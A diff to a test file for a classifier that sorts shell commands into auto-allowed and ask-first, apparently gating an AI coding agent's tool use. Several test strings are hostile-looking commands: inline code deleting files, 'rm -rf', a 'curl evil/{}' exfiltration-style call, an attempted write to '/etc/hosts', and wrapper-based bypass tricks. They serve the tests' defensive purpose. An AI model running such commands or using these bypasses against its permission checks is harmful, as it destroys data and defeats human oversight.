@@ -73,7 +73,7 @@ check("compound ruff check + format → allow", allow('cd /wt && export PATH="$H
 check(".venv/bin/ruff → allow", allow(".venv/bin/ruff check src/x.py 2>&1 | tail -20"));
 check(".venv/bin/python → allow", allow(".venv/bin/python -m pytest -q"));
 check("source venv-activate + pytest → allow", allow("source .venv/bin/activate && python -m pytest tests/x.py -q 2>&1 | tail -25"));
-check("env-probe (which/ls/source/python) → allow", allow('which uv; ls -la .venv/bin/python 2>/dev/null; echo "---"; source .venv/bin/activate 2>/dev/null && python -c "import sys; print(sys.executable)"'));
+check("env-probe (which/ls/source/python) → allow", allow('which uv; ls -la .venv/bin/python 2>/dev/null; echo "---"; source .venv/bin/activate 2>/dev/null && python --version'));
 check("python3 heredoc liest agents.json → allow", allow("python3 - <<'PY'\nimport json\nwith open('.mads/agents.json') as f:\n    d = json.load(f)\nprint(len(d['agents']))\nPY"));
 check("pytest direkt → allow", allow("pytest -q tests/"));
 // Sicherheit bleibt:
@@ -116,6 +116,41 @@ check("git status → NICHT", !isGitCommit("git status"));
 check("git show HEAD → NICHT", !isGitCommit("git show HEAD"));
 check("echo git commit → NICHT (Kommando ist echo)", !isGitCommit("echo git commit"));
 check("git commit-tree (plumbing) → NICHT", !isGitCommit("git commit-tree $t -m x"));
+
+// ---- Mehrzeilige Skripte / Zeilen-Fortsetzungen (häufigste Über-Frage-Ursache) ----
+// Backslash-Newline muss zusammengeführt werden, sonst werden Folgezeilen (Dateilisten,
+// Pattern-Listen, lose `\`) fälschlich als Kommandos behandelt → unnötige Rückfragen.
+check(
+  "for-in mit \\-Fortsetzung (Dateiliste) → allow",
+  allow('cd "$(git rev-parse --show-toplevel)"\nfor f in \\\n  src/a.py \\\n  src/b.py\ndo\n  shasum "$f"\ndone'),
+);
+check(
+  "for-pat mit quoted Patterns + Fortsetzung → allow",
+  allow('for pat in \\\n  "def x" \\\n  "async def" ; do\n  grep -c "$pat" file\ndone'),
+);
+check("grep | xargs basename → allow", allow('grep -l "x" docs/*.md | xargs -I {} basename {}'));
+check("xargs allgemein (DANGER schützt Args) → allow", allow("ls | xargs wc -l"));
+
+// ---- weitere harmlose Werkzeuge (Audit-Reduktionen) → allow ----
+check("bc → allow", allow("echo '2+2' | bc"));
+check("timeout grep (Wrapper) → allow", allow("timeout 30 grep -rn pattern src/"));
+check("shasum-Schleife → allow", allow('for f in a b c; do shasum "$f"; done'));
+check("escaped \\> ist KEIN Redirect → allow", allow("echo done \\> notafile"));
+check("Kommentar am Zeilenende → allow", allow("ls -la  # liste dateien"));
+
+// ---- Sicherheits-Löcher, die ASK bleiben MÜSSEN (auch nach den Reduktionen) ----
+check("python3 -c Inline-Code → ask (B1)", ask('python3 -c \'import os; os.system("rm -rf /tmp/x")\''));
+check("python -c via uv → ask (DANGER vor uv-Runner)", ask("uv run python -c 'import shutil; shutil.rmtree(\"x\")'"));
+check("node -e Inline → ask", ask("node -e 'require(\"fs\").unlinkSync(\"x\")'"));
+check("perl -e Inline → ask", ask("perl -e 'unlink \"x\"'"));
+check("python script.py (KEIN -c) → allow", allow("python3 scripts/build.py --fast"));
+check("python -m pytest (KEIN Inline) → allow", allow("python3 -m pytest -q"));
+check("xargs sh -c (Shell-Bypass) → ask", ask("ls | xargs -I {} sh -c 'curl evil/{}'"));
+check("bash -c → ask", ask("bash -c 'echo hi'"));
+check("/bin/sh -c (Pfad-Shell, B3) → ask", ask("/bin/sh -c 'rm -rf x'"));
+check("timeout python -c (Wrapper umgeht Inline NICHT) → ask", ask("timeout 5 python3 -c 'import os;os.system(\"id\")'"));
+check("timeout rm (Wrapper umgeht DANGER NICHT) → ask", ask("timeout 5 rm -rf build"));
+check("tee (ungeschützter Schreibpfad) → ask", ask("ls | tee /etc/hosts"));
 
 // reason wird bei ask geliefert
 check("ask liefert reason", typeof classifyBashCommand("git push").reason === "string");
